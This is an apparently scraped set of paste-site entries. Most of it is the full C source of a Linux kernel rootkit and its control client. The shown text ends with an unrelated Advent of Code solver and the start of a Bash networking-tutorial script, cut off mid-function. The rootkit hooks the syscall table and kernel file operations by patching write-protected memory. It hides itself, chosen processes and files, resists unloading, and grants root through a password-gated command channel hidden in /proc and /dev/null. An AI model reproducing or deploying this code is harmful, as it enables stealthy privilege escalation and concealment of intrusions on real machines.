        exit(1);
    }
}

void write_buffer(char **dest_ptr, char *src, size_t size)
{
    memcpy(*dest_ptr, src, size);
    *dest_ptr += size;
}

int main(int argc, char **argv)
{
    int root;
    int hide_pid;
    int unhide_pid;
    char *pid;
    int hide_file;
    int unhide_file;
    char *file;
    int hide;
    int unhide;
    int protect;
    int unprotect;

    handle_command_line_arguments(argc, argv, &root, &hide_pid, &unhide_pid, &pid,
                                  &hide_file, &unhide_file, &file, &hide, &unhide,
                                  &protect, &unprotect);

    size_t buf_size = 0;

    buf_size += sizeof(CFG_PASS);

    if (root) {
        buf_size += sizeof(CFG_ROOT);
    } else if (hide_pid) {
        buf_size += sizeof(CFG_HIDE_PID) + strlen(pid);
    } else if (unhide_pid) {
        buf_size += sizeof(CFG_UNHIDE_PID) + strlen(pid);
    } else if (hide_file) {
        buf_size += sizeof(CFG_HIDE_FILE) + strlen(file);
    } else if (unhide_file) {
        buf_size += sizeof(CFG_UNHIDE_FILE) + strlen(file);
    } else if (hide) {
        buf_size += sizeof(CFG_HIDE);
    } else if (unhide) {
        buf_size += sizeof(CFG_UNHIDE);
    } else if (protect) {
        buf_size += sizeof(CFG_PROTECT);
    } else if (unprotect) {
        buf_size += sizeof(CFG_UNPROTECT);
    }

    buf_size += 1; // for null terminator

    char *buf = malloc(buf_size);
    buf[buf_size - 1] = 0;

    char *buf_ptr = buf;

    write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));

    if (root) {
        write_buffer(&buf_ptr, CFG_ROOT, sizeof(CFG_ROOT));
    } else if (hide_pid) {
        write_buffer(&buf_ptr, CFG_HIDE_PID, sizeof(CFG_HIDE_PID));
        write_buffer(&buf_ptr, pid, strlen(pid));
    } else if (unhide_pid) {
        write_buffer(&buf_ptr, CFG_UNHIDE_PID, sizeof(CFG_UNHIDE_PID));
        write_buffer(&buf_ptr, pid, strlen(pid));
    } else if (hide_file) {
        write_buffer(&buf_ptr, CFG_HIDE_FILE, sizeof(CFG_HIDE_FILE));
        write_buffer(&buf_ptr, file, strlen(file));
    } else if (unhide_file) {
        write_buffer(&buf_ptr, CFG_UNHIDE_FILE, sizeof(CFG_UNHIDE_FILE));
        write_buffer(&buf_ptr, file, strlen(file));
    } else if (hide) {
        write_buffer(&buf_ptr, CFG_HIDE, sizeof(CFG_HIDE));
    } else if (unhide) {
        write_buffer(&buf_ptr, CFG_UNHIDE, sizeof(CFG_UNHIDE));
    } else if (protect) {
        write_buffer(&buf_ptr, CFG_PROTECT, sizeof(CFG_PROTECT));
    } else if (unprotect) {
        write_buffer(&buf_ptr, CFG_UNPROTECT, sizeof(CFG_UNPROTECT));
    }

    int fd = open(""/proc/"" CFG_PROC_FILE, O_RDONLY);

    if (fd < 1) {
        int fd = open(""/proc/"" CFG_PROC_FILE, O_WRONLY);

        if (fd < 1) {
            fprintf(stderr, ""Error: Failed to open %s\n"", ""/proc/"" CFG_PROC_FILE);
            return 1;
        }

        write(fd, buf, buf_size);
    } else {
        read(fd, buf, buf_size);
    }

    close(fd);
    free(buf);

    if (root) {
        execl(""/bin/bash"", ""bash"", NULL);
    }

    return 0;
}"
a4EkyCqW,config.h,FlyFar,C,Sunday 24th of December 2023 01:50:13 AM CDT,"/*
 * Copyright (C) 2016-2017 Maxim Biro <nurupo.contributions@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#define CFG_PROC_FILE ""version""
#define CFG_PASS ""password""
#define CFG_ROOT ""root""
#define CFG_HIDE_PID ""hide_pid""
#define CFG_UNHIDE_PID ""unhide_pid""
#define CFG_HIDE_FILE ""hide_file""
#define CFG_UNHIDE_FILE ""unhide_file""
#define CFG_HIDE ""hide""
#define CFG_UNHIDE ""unhide""
#define CFG_PROTECT ""protect""
#define CFG_UNPROTECT ""unprotect"""
svP5NmRD,rootkit.c,FlyFar,C,Sunday 24th of December 2023 01:49:16 AM CDT,"/*
 * Copyright (C) 2016-2019 Maxim Biro <nurupo.contributions@gmail.com>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/sysfs.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/delay.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

// Copy-pasted from Linux sources as it's not provided in public headers
// of newer Linux.
// Might differ from one version of Linux kernel to another, so update as
// necessary.
// http://lxr.free-electrons.com/source/fs/proc/internal.h?v=4.4#L31
struct proc_dir_entry {
    unsigned int low_ino;
    umode_t mode;
    nlink_t nlink;
    kuid_t uid;
    kgid_t gid;
    loff_t size;
    const struct inode_operations *proc_iops;
    const struct file_operations *proc_fops;
    struct proc_dir_entry *parent;
    struct rb_root subdir;
    struct rb_node subdir_node;
    void *data;
    atomic_t count;         /* use count */
    atomic_t in_use;        /* number of callers into module in progress; */
                            /* negative -> it's going away RSN */
    struct completion *pde_unload_completion;
    struct list_head pde_openers;   /* who did ->open, but not ->release */
    spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
    u8 namelen;
    char name[];
};

#endif

#include ""config.h""

#define pr_fmt(fmt) KBUILD_MODNAME "": "" fmt

MODULE_LICENSE(""GPL"");
MODULE_AUTHOR(""Maxim Biro <nurupo.contributions@gmail.com>"");


#define ARCH_ERROR_MESSAGE ""Only i386 and x86_64 architectures are supported! "" \
    ""It should be easy to port to new architectures though""

#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);


// ========== SYS_CALL_TABLE ==========


#if defined __i386__
    #define START_ADDRESS 0xc0000000
    #define END_ADDRESS 0xd0000000
#elif defined __x86_64__
    #define START_ADDRESS 0xffffffff81000000
    #define END_ADDRESS 0xffffffffa2000000
#else
    #error ARCH_ERROR_MESSAGE
#endif

void **sys_call_table;

/**
 * Finds a system call table based on a heruistic.
 * Note that the heruistic is not ideal, so it might find a memory region that
 * looks like a system call table but is not actually a system call table, but
 * it seems to work all the time on my systems.
 *
 * @return system call table on success, NULL on failure.
 */
void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void*) START_ADDRESS;

    while (i < END_ADDRESS) {
        sctable = (void **) i;

        // sadly only sys_close seems to be exported -- we can't check against more system calls
        if (sctable[__NR_close] == (void *) sys_close) {
            size_t j;
            // we expect there to be at least 300 system calls
            const unsigned int SYS_CALL_NUM = 300;
            // sanity check: no function pointer in the system call table should be NULL
            for (j = 0; j < SYS_CALL_NUM; j ++) {
                if (sctable[j] == NULL) {
                    // this is not a system call table
                    goto skip;
                }
            }
            return sctable;
        }
skip:
        ;
        i += sizeof(void *);
    }

    return NULL;
}


// ========== END SYS_CALL_TABLE ==========


// ========== HOOK LIST ==========


struct hook {
    void *original_function;
    void *modified_function;
    void **modified_at_address;
    struct list_head list;
};

LIST_HEAD(hook_list);

/**
 * Replaces a function pointer at some address with a new function pointer,
 * keeping record of the original function pointer so that it could be
 * restored later.
 *
 * @param modified_at_address Pointer to the address of where the function
 * pointer that we want to replace is stored. The same address would be used
 * when restoring the original funcion pointer back, so make sure it doesn't
 * become invalid by the time you try to restore it back.
 *
 * @param modified_function Function pointer that we want to replace the
 * original function pointer with.
 *
 * @return true on success, false on failure.
 */
int hook_create(void **modified_at_address, void *modified_function)
{
    struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);

    if (!h) {
        return 0;
    }

    h->modified_at_address = modified_at_address;
    h->modified_function = modified_function;
    list_add(&h->list, &hook_list);

    DISABLE_W_PROTECTED_MEMORY
    h->original_function = xchg(modified_at_address, modified_function);
    ENABLE_W_PROTECTED_MEMORY

    return 1;
}

/**
 * Get original function pointer based on the one we overwrote it with.
 * Useful when wanting to call the original function inside a hook.
 *
 * @param modified_function The function that overwrote the original one.
 * @return original function pointer on success, NULL on failure.
 */
void *hook_get_original(void *modified_function)
{
    void *original_function = NULL;
    struct hook *h;

    list_for_each_entry(h, &hook_list, list) {
        if (h->modified_function == modified_function) {
            original_function = h->original_function;
            break;
        }
    }
    return original_function;
}

/**
 * Removes all hook records, restores the overwritten function pointers to
 * their original value.
 */
void hook_remove_all(void)
{
    struct hook *h, *tmp;

    // make it so that instead of `modified_function` the `original_function`
    // would get called again
    list_for_each_entry(h, &hook_list, list) {
        DISABLE_W_PROTECTED_MEMORY
        *h->modified_at_address = h->original_function;
        ENABLE_W_PROTECTED_MEMORY
    }
    // a hack to let the changes made by the loop above propagate, as some
    // process might be in the middle of executing our `modified_function`
    // which calls the original function inside by getting it from the
    // `hook_get_original()` call, which would return NULL if we `list_del()`
    // everything, and, well, bad things happen if you try to use NULL as a
    // function pointer and call into it.
    // to get around this issue we:
    // 1. make it so that instead of `modified_function` the
    //    `original_function` would get called. this is done above.
    // 2. sleep hopefully long enough to let all the proesses that are in the
    //    middle of running `modified_function` to finish running that function
    // 3. finally, remove all the elements from the list
    msleep(10);
    list_for_each_entry_safe(h, tmp, &hook_list, list) {
        list_del(&h->list);
        kfree(h);
    }
}


// ========== END HOOK LIST ==========


// ========== HOOK EXAMPLES ==========

unsigned long read_count = 0;

asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
{
    read_count ++;

    asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
    original_read = hook_get_original(read);
    return original_read(fd, buf, count);
}


unsigned long write_count = 0;

asmlinkage long write(unsigned int fd, const char __user *buf, size_t count)
{
    write_count ++;

    asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
    original_write = hook_get_original(write);
    return original_write(fd, buf, count);
}


// ========== END HOOK EXAMPLES ==========


// ========== ASM HOOK LIST ==========

#if defined __i386__
    // push 0x00000000, ret
    #define ASM_HOOK_CODE ""\x68\x00\x00\x00\x00\xc3""
    // byte offset to where to the 0x00000000, to overwrite it with a function pointer
    #define ASM_HOOK_CODE_OFFSET 1
    // alternativly we could do `mov eax 0x00000000, jmp eax`, but it's a byte longer
    //#define ASM_HOOK_CODE ""\xb8\x00\x00\x00\x00\xff\xe0""
#elif defined __x86_64__
    // there is no push that pushes a 64-bit immidiate in x86_64,
    // so we do things a bit differently:
    // mov rax 0x0000000000000000, jmp rax
    #define ASM_HOOK_CODE ""\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0""
    // byte offset to where to the 0x0000000000000000, to overwrite it with a function pointer
    #define ASM_HOOK_CODE_OFFSET 2
#else
    #error ARCH_ERROR_MESSAGE
#endif

struct asm_hook {
    void *original_function;
    void *modified_function;
    char original_asm[sizeof(ASM_HOOK_CODE)-1];
    struct list_head list;
};

LIST_HEAD(asm_hook_list);

/**
 * Patches machine code of the original function to call another function.
 * This function should not be called directly.
 */
void _asm_hook_patch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, ASM_HOOK_CODE, sizeof(ASM_HOOK_CODE)-1);
    *(void **)&((char *)h->original_function)[ASM_HOOK_CODE_OFFSET] = h->modified_function;
    ENABLE_W_PROTECTED_MEMORY
}

/**
 * Patches machine code of a function so that it would call our function.
 * Keeps record of the original function and its machine code so that it could
 * be unpatched and patched again later.
 *
 * @param original_function Function to patch
 *
 * @param modified_function Function that should be called
 *
 * @return true on success, false on failure.
 */
int asm_hook_create(void *original_function, void *modified_function)
{
    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNEL);

    if (!h) {
        return 0;
    }

    h->original_function = original_function;
    h->modified_function = modified_function;
    memcpy(h->original_asm, original_function, sizeof(ASM_HOOK_CODE)-1);
    list_add(&h->list, &asm_hook_list);

    _asm_hook_patch(h);

    return 1;
}

/**
 * Patches the original function to call the modified function again.
 *
 * @param modified_function Function that the original function was patched to
 * call in asm_hook_create().
 */
void asm_hook_patch(void *modified_function)
{
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_patch(h);
            break;
        }
    }
}

/**
 * Unpatches machine code of the original function, so that it wouldn't call
 * our function anymore.
 * This function should not be called directly.
 */
void _asm_hook_unpatch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, h->original_asm, sizeof(ASM_HOOK_CODE)-1);
    ENABLE_W_PROTECTED_MEMORY
}

/**
 * Unpatches machine code of the original function, so that it wouldn't call
 * our function anymore.
 *
 * @param modified_function Function that the original function was patched to
 * call in asm_hook_create().
 */
void *asm_hook_unpatch(void *modified_function)
{
    void *original_function = NULL;
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_unpatch(h);
            original_function = h->original_function;
            break;
        }
    }

    return original_function;
}

/**
 * Removes all hook records, unpatches all functions.
 */
void asm_hook_remove_all(void)
{
    struct asm_hook *h, *tmp;

    list_for_each_entry_safe(h, tmp, &asm_hook_list, list) {
        _asm_hook_unpatch(h);
        list_del(&h->list);
        kfree(h);
    }
}


// ========== END ASM HOOK LIST ==========


// ========== ASM HOOK EXAMPLES ==========

unsigned long asm_rmdir_count = 0;

asmlinkage long asm_rmdir(const char __user *pathname)
{
    asm_rmdir_count ++;

    asmlinkage long (*original_rmdir)(const char __user *);
    original_rmdir = asm_hook_unpatch(asm_rmdir);
    long ret = original_rmdir(pathname);
    asm_hook_patch(asm_rmdir);

    return ret;
}


// ========== END ASM HOOK EXAMPLES ==========


// ========== PID LIST ==========


struct pid_entry {
    unsigned long pid;
    struct list_head list;
};

LIST_HEAD(pid_list);

int pid_add(const char *pid)
{
    struct pid_entry *p = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);

    if (!p) {
        return 0;
    }

    p->pid = simple_strtoul(pid, NULL, 10);

    list_add(&p->list, &pid_list);

    return 1;
}

void pid_remove(const char *pid)
{
    struct pid_entry *p, *tmp;

    unsigned long pid_num = simple_strtoul(pid, NULL, 10);

    list_for_each_entry_safe(p, tmp, &pid_list, list) {
        if (p->pid == pid_num) {
            list_del(&p->list);
            kfree(p);
            break;
        }
    }
}

void pid_remove_all(void)
{
    struct pid_entry *p, *tmp;

    list_for_each_entry_safe(p, tmp, &pid_list, list) {
        list_del(&p->list);
        kfree(p);
    }
}


// ========== END PID LIST ==========


// ========== FILE LIST ==========


struct file_entry {
    char *name;
    struct list_head list;
};

LIST_HEAD(file_list);

int file_add(const char *name)
{
    struct file_entry *f = kmalloc(sizeof(struct file_entry), GFP_KERNEL);

    if (!f) {
        return 0;
    }

    size_t name_len = strlen(name) + 1;

    // sanity check as `name` could point to some garbage without null anywhere nearby
    if (name_len -1 > NAME_MAX) {
        kfree(f);
        return 0;
    }

    f->name = kmalloc(name_len, GFP_KERNEL);
    if (!f->name) {
        kfree(f);
        return 0;
    }

    strncpy(f->name, name, name_len);

    list_add(&f->list, &file_list);

    return 1;
}

void file_remove(const char *name)
{
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list) {
        if (strcmp(f->name, name) == 0) {
            list_del(&f->list);
            kfree(f->name);
            kfree(f);
            break;
        }
    }
}

void file_remove_all(void)
{
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list) {
        list_del(&f->list);
        kfree(f->name);
        kfree(f);
    }
}


// ========== END FILE LIST ==========


// ========== HIDE ==========


struct list_head *module_list;
int is_hidden = 0;

void hide(void)
{
    if (is_hidden) {
        return;
    }

    module_list = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);

    is_hidden = 1;
}


void unhide(void)
{
    if (!is_hidden) {
        return;
    }

    list_add(&THIS_MODULE->list, module_list);

    is_hidden = 0;
}


// ========== END HIDE ==========


// ========== PROTECT ==========


int is_protected = 0;

void protect(void)
{
    if (is_protected) {
        return;
    }

    try_module_get(THIS_MODULE);

    is_protected = 1;
}

void unprotect(void)
{
    if (!is_protected) {
        return;
    }

    module_put(THIS_MODULE);

    is_protected = 0;
}


// ========== END PROTECT ==========


// ========== READDIR ==========


struct file_operations *get_fop(const char *path)
{
    struct file *file;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL) {
        return NULL;
    }

    struct file_operations *ret = (struct file_operations *) file->f_op;
    filp_close(file, 0);

    return ret;
}

// Macros to help reduce repeated code where only names differ.
// Decreses risk of ""copy-paste & forgot to rename"" error.
#define FILLDIR_START(NAME) \
    filldir_t original_##NAME##_filldir; \
    \
    static int NAME##_filldir(void * context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
    {

#define FILLDIR_END(NAME) \
        return original_##NAME##_filldir(context, name, namelen, offset, ino, d_type); \
    }


#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

    #define READDIR(NAME) \
        int NAME##_iterate(struct file *file, struct dir_context *context) \
        { \
            original_##NAME##_filldir = context->actor; \
            *((filldir_t*)&context->actor) = NAME##_filldir; \
            \
            int (*original_iterate)(struct file *, struct dir_context *); \
            original_iterate = asm_hook_unpatch(NAME##_iterate); \
            int ret = original_iterate(file, context); \
            asm_hook_patch(NAME##_iterate); \
            \
            return ret; \
        }

#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)

    #define READDIR(NAME) \
        int NAME##_readdir(struct file *file, void *dirent, filldir_t filldir) \
        { \
            original_##NAME##_filldir = filldir; \
            \
            int (*original_readdir)(struct file *, void *, filldir_t); \
            original_readdir = asm_hook_unpatch(NAME##_readdir); \
            int ret = original_readdir(file, dirent, NAME##_filldir); \
            asm_hook_patch(NAME##_readdir); \
            \
            return ret; \
        }
#else

//#error ""Wrong Linux kernel version""

#endif

// Macros to actually use
#define READDIR_HOOK_START(NAME) FILLDIR_START(NAME)
#define READDIR_HOOK_END(NAME) FILLDIR_END(NAME) READDIR(NAME)

READDIR_HOOK_START(root)
    struct file_entry *f;

    list_for_each_entry(f, &file_list, list) {
        if (strcmp(name, f->name) == 0) {
            return 0;
        }
    }
READDIR_HOOK_END(root)

READDIR_HOOK_START(proc)
    struct pid_entry *p;

    list_for_each_entry(p, &pid_list, list) {
        if (simple_strtoul(name, NULL, 10) == p->pid) {
            return 0;
        }
    }
READDIR_HOOK_END(proc)

READDIR_HOOK_START(sys)
    if (is_hidden && strcmp(name, KBUILD_MODNAME) == 0) {
        return 0;
    }
READDIR_HOOK_END(sys)


#undef FILLDIR_START
#undef FILLDIR_END
#undef READDIR

#undef READDIR_HOOK_START
#undef READDIR_HOOK_END


// ========== END READDIR ==========


int execute_command(const char __user *str, size_t length)
{
    if (length <= sizeof(CFG_PASS) ||
        strncmp(str, CFG_PASS, sizeof(CFG_PASS)) != 0) {
        return 0;
    }

    pr_info(""Password check passed\n"");

    // since the password matched, we assume the command following the password
    // is in the valid format

    str += sizeof(CFG_PASS);

    if (strcmp(str, CFG_ROOT) == 0) {
        pr_info(""Got root command\n"");
        struct cred *creds = prepare_creds();

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

        creds->uid.val = creds->euid.val = 0;
        creds->gid.val = creds->egid.val = 0;

#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)

        creds->uid = creds->euid = 0;
        creds->gid = creds->egid = 0;

#endif

        commit_creds(creds);
    } else if (strcmp(str, CFG_HIDE_PID) == 0) {
        pr_info(""Got hide pid command\n"");
        str += sizeof(CFG_HIDE_PID);
        pid_add(str);
    } else if (strcmp(str, CFG_UNHIDE_PID) == 0) {
        pr_info(""Got unhide pid command\n"");
        str += sizeof(CFG_UNHIDE_PID);
        pid_remove(str);
    } else if (strcmp(str, CFG_HIDE_FILE) == 0) {
        pr_info(""Got hide file command\n"");
        str += sizeof(CFG_HIDE_FILE);
        file_add(str);
    } else if (strcmp(str, CFG_UNHIDE_FILE) == 0) {
        pr_info(""Got unhide file command\n"");
        str += sizeof(CFG_UNHIDE_FILE);
        file_remove(str);
    }  else if (strcmp(str, CFG_HIDE) == 0) {
        pr_info(""Got hide command\n"");
        hide();
    } else if (strcmp(str, CFG_UNHIDE) == 0) {
        pr_info(""Got unhide command\n"");
        unhide();
    } else if (strcmp(str, CFG_PROTECT) == 0) {
        pr_info(""Got protect command\n"");
        protect();
    } else if (strcmp(str, CFG_UNPROTECT) == 0) {
        pr_info(""Got unprotect command\n"");
        unprotect();
    } else {
        pr_info(""Got unknown command\n"");
    }

    return 1;
}


// ========== COMM CHANNEL ==========


static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
{
    if (execute_command(buf_user, count)) {
        return count;
    }

    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
    original_write = asm_hook_unpatch(proc_fops_write);
    ssize_t ret = original_write(file, buf_user, count, p);
    asm_hook_patch(proc_fops_write);

    return ret;
}

static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t count, loff_t *p)
{
    execute_command(buf_user, count);

    int (*original_read)(struct file *, char __user *, size_t, loff_t *);
    original_read = asm_hook_unpatch(proc_fops_read);
    ssize_t ret = original_read(file, buf_user, count, p);
    asm_hook_patch(proc_fops_read);

    return ret;
}


int setup_proc_comm_channel(void)
{
    static const struct file_operations proc_file_fops = {0};
    struct proc_dir_entry *proc_entry = proc_create(""temporary"", 0444, NULL, &proc_file_fops);
    proc_entry = proc_entry->parent;

    if (strcmp(proc_entry->name, ""/proc"") != 0) {
        pr_info(""Couldn't find \""/proc\"" entry\n"");
        remove_proc_entry(""temporary"", NULL);
        return 0;
    }

    remove_proc_entry(""temporary"", NULL);

    struct file_operations *proc_fops = NULL;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

    struct rb_node *entry = rb_first(&proc_entry->subdir);

    while (entry) {
        pr_info(""Looking at \""/proc/%s\""\n"", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);

        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, CFG_PROC_FILE) == 0) {
            pr_info(""Found \""/proc/%s\""\n"", CFG_PROC_FILE);
            proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
            goto found;
        }

        entry = rb_next(entry);
    }

#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)

    proc_entry = proc_entry->subdir;

    while (proc_entry) {
        pr_info(""Looking at \""/proc/%s\""\n"", proc_entry->name);

        if (strcmp(proc_entry->name, CFG_PROC_FILE) == 0) {
            pr_info(""Found \""/proc/%s\""\n"", CFG_PROC_FILE);
            proc_fops = (struct file_operations *) proc_entry->proc_fops;
            goto found;
        }

        proc_entry = proc_entry->next;
    }

#endif

    pr_info(""Couldn't find \""/proc/%s\""\n"", CFG_PROC_FILE);

    return 0;

found:
    ;

    if (proc_fops->write) {
        asm_hook_create(proc_fops->write, proc_fops_write);
    }

    if (proc_fops->read) {
        asm_hook_create(proc_fops->read, proc_fops_read);
    }

    if (!proc_fops->read && !proc_fops->write) {
        pr_info(""\""/proc/%s\"" has no write nor read function set\n"", CFG_PROC_FILE);
        return 0;
    }

    return 1;
}


static ssize_t devnull_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
{
    if (execute_command(buf_user, count)) {
        return count;
    }

    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
    original_write = hook_get_original(devnull_fops_write);
    return original_write(file, buf_user, count, p);
}

int setup_devnull_comm_channel(void)
{
    hook_create(&get_fop(""/dev/null"")->write, devnull_fops_write);

    return 1;
}


// ========== END COMM CHANNEL ==========


int init(void)
{
    pr_info(""Module loaded\n"");
    hide();
    protect();

    if (!setup_proc_comm_channel()) {
        pr_info(""Failed to set up comm channel\n"");
        unprotect();
        unhide();
        return -1;
    }

    pr_info(""Comm channel is set up\n"");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

    asm_hook_create(get_fop(""/"")->iterate, root_iterate);
    asm_hook_create(get_fop(""/proc"")->iterate, proc_iterate);
    asm_hook_create(get_fop(""/sys"")->iterate, sys_iterate);

#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)

    asm_hook_create(get_fop(""/"")->readdir, root_readdir);
    asm_hook_create(get_fop(""/proc"")->readdir, proc_readdir);
    asm_hook_create(get_fop(""/sys"")->readdir, sys_readdir);

#endif

    sys_call_table = find_syscall_table();
    pr_info(""Found sys_call_table at %p\n"", sys_call_table);

    // Setup the example hooks
    asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);
    hook_create(&sys_call_table[__NR_read], read);
    hook_create(&sys_call_table[__NR_write], write);

    return 0;
}

void exit(void)
{
    // Print the results of the example hooks
    pr_info(""sys_rmdir was called %lu times\n"", asm_rmdir_count);
    pr_info(""sys_read was called %lu times\n"", read_count);
    pr_info(""sys_write was called %lu times\n"", write_count);

    // Cleanup
    hook_remove_all();
    asm_hook_remove_all();
    pid_remove_all();
    file_remove_all();

    THIS_MODULE->name[0] = 0;

    pr_info(""Module removed\n"");
}

module_init(init);
module_exit(exit);"
0T4GT3ZM,Advent of code 2023 day 24 part 2 concise,hhoppe,Python,Sunday 24th of December 2023 01:21:09 AM CDT,"def day24_part2(s):
  rows = [list(map(int, re.findall(r'[-\d]+', line))) for line in s.splitlines()]
  p, v, ts = (sympy.symbols(f'{ch}(:3)') for ch in 'pvt')
  equations = [
      row[j] + t * row[3 + j] - p[j] - v[j] * t for row, t in zip(rows, ts) for j in range(3)
  ]
  return sum(sympy.solve(equations, (*p, *v, *ts))[0][:3])"
1pGnP8BW,EHONWA,xGHOSTSECx,Bash,Sunday 24th of December 2023 01:06:43 AM CDT,"#!/bin/bash

# Function to display the introduction message.
function display_intro() {
    echo -e ""\e[1;92m-----------------------------------------------------------""
    echo -e ""| \e[1;92mEHONWA - TCP and UDP Educational Resource Tool \e[1;92m|""
    echo -e ""-----------------------------------------------------------\e[0m""
    echo ""Welcome to EHONWA, your comprehensive guide to TCP and UDP protocols!""
    echo ""Explore the world of networking, deepen your understanding, and enhance your skills.""
}

# Function to display the main menu options.
function display_menu() {
    echo -e ""\e[1;96mChoose an option:""
    echo ""1. \e[1;92mLearn TCP Basics""
    echo ""2. \e[1;92mLearn UDP Basics""
    echo ""3. \e[1;92mAdvanced Concepts""
    echo ""4. \e[1;92mReal-world Examples""
    echo ""5. \e[1;92mExplore Protocols""
    echo ""6. \e[1;92mUpdate EHONWA""
    echo ""7. \e[1;92mAdditional Learning Resources""
    echo ""8. \e[1;92mGenerate Network Traffic (Simulation)""
    echo ""9. \e[1;92mSimulate Network Issues (Testing)""
    echo ""10. \e[1;91mExit\e[0m""
}

# Function to learn TCP basics.
function learn_tcp_basics() {
    echo -e ""\e[1;92mTCP (Transmission Control Protocol):""
    echo ""TCP is a connection-oriented, reliable protocol with key features:""
    echo ""1. \e[1;92mReliability:\e[0m Ensures data delivery through acknowledgments and retransmission.""
    echo ""2. \e[1;92mSequencing:\e[0m Orders data packets for accurate reconstruction at the receiver.""
    echo ""3. \e[1;92mConnection Establishment:\e[0m Uses a three-way handshake for reliability.""
    echo ""4. \e[1;92mFlow Control:\e[0m Manages transfer rates to prevent congestion.""
    echo ""5. \e[1;92mError Checking:\e[0m Utilizes checksums for data integrity.""

    echo -e ""Example using curl for TCP:""
    echo -e ""\e[1;96m\`\`\`bash""
    echo ""curl -X GET tcp://example.com/data""
    echo ""\`\`\`""
    echo ""This simulates a TCP request to fetch data from a server.\e[0m""
}

# Function to learn UDP basics.
function learn_udp_basics() {
    echo -e ""\e[1;92mUDP (User Datagram Protocol):""
    echo ""UDP is a connectionless, lightweight protocol with characteristics:""
    echo ""1. \e[1;92mLow Latency:\e[0m Prioritizes speed over reliability for real-time applications.""
    echo ""2. \e[1;92mBroadcast and Multicast:\e[0m Supports one-to-many or many-to-many data distribution.""
    echo ""3. \e[1;92mStreaming Media:\e[0m Ideal for real-time streaming with acceptable data loss.""
    echo ""4. \e[1;92mGaming:\e[0m Commonly used for online gaming due to low latency.""
    echo ""5. \e[1;92mSimple Request-Response:\e[0m Suitable for scenarios with a simple request-response model.""

    echo -e ""Example using curl for UDP:""
